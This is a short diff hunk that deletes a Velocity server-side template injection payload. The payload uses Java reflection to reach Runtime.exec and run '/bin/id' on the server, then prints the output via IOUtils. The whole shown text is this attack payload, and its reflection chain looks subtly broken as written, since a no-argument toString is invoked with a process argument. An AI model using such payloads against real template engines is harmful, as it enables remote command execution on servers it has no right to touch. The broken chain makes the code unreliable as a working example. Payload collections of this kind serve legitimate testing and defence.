@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("org.apache.commons.io.IOUtils").getMethod("toString",null).invoke(null,$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/bin/id",null,null));
